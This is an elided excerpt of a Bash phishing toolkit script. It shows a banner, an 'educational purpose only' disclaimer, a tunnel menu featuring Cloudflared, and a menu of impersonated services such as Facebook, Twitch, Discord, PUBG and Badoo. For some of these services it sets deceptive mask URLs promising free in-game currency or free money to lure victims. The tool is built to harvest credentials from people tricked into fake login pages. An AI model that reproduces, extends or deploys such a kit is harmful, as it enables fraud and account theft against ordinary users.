...
banner() {
  ...
  __  __             _    _            _             
${BLUE} |  \/  |           | |  | |          | |            
${GREEN} | \  / |_ __ ______| |__| | __ _  ___| | _____ _ __ 
${BLUE} | |\/| |'__|______'|  __  |/ _' |/ __| |/ / _ \ '__|
${GREEN} | |  | | |         | |  | | (_| | (__|   <  __/ |   
${BLUE} |_|  |_|_|         |_|  |_|\__,_|\___|_|\_\___|_|                                                                                                                                                                              
                                             ${U7P4L}Version : 1.0                                                           

		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by ANONYMOUS U7P4L (M-U7P4L)${WHITE}
	EOF
}
...
banner_small() {
	cat <<- EOF
		${BLUE}                       _     _     _               
                      | |   (_)   | |              
  _ __ ___  _ __ _ __ | |__  _ ___| |__   ___ _ __ 
...
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using My tool. By By See you.${RESETBG}\n"
	{ reset_color; exit 0; }
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANGE}ANONYMOUS U7P4L ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/ANONYMOUS-U7P4L
		${GREEN}Version  ${RED}:  ${ORANGE}1.0

		${RED}Warning:${WHITE}
		${REDBG}${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}${RESETBG}
...
tunnel_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Best!${RED}]
...
main_menu() {
	...
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} Pubg(Under Constru...)
		...
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} DeviantArt
	...
	case $REPLY in 
		...
		21)
			website="pubg"
			mask='http://get-uc-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='http://get-500-usd-free-to-your-acount'
